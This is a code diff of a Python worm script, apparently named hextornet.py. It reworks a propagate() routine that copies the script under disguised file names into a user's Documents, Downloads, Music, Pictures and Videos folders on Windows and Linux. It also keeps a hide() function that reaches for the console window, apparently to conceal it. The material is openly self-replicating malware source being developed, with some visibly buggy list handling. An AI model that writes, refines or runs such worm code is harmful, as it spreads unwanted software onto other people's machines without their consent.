@@ -27,12 +27,10 @@ src = os.path.abspath('hextornet.py')
 usr = getpass.getuser()
 lang = locale.getdefaultlocale()
 
-directories = ""
-dst = ""
-
-hextornet = ['winHex.py', 'Hxtprocess.py', 'HXTNet.py', 'HxWinProcess.py']
+hextornet = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
 directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
 
+dst = ""
 
 def hide():
 	window = win32console.GetConsoleWindow()
@@ -64,28 +62,29 @@ def linux_client(system = sys.platform):
     else:
         return False
 
+def copyHex(hexworm, src, dst):
+	copyfile(src, dst)
+	print'[DST]', dst
+	hextornet.remove(hexworm)
 
 def propagate():
-	global lang_es
-	global lang_en
-	global directories
 	print("==========Worm location==========")
 	while len(directories) != 0:
 		for directory in directories:
-			if(windows_client):
+			if windows_client():
 				for hexworm in hextornet:
 					dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + str(hexworm) + '.py'
-					copyfile(src, dst)
-					print'dst',dst
+					copyHex(hexworm, src, dst)
+					directories.remove(directory)
 
-			elif(linux_client):
+			elif linux_client():
 				for hexworm in hextornet:
-					dst = '/root' + usr + '/' + directory + '/' + str(hexworm) + '.py'
-					copyfile(src, dst)
-					print'dst',dst
+					print'[DEBUG] WORM | DIRECTORY:',hexworm, directory
+					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
+					copyHex(hexworm, src, dst)
+				directories.remove(directory)
 			else:
 				dst = os.getcwd() + "hextornet.py"
-			directories.remove(directory)
 	print("=================================")
 
 #Use in windows
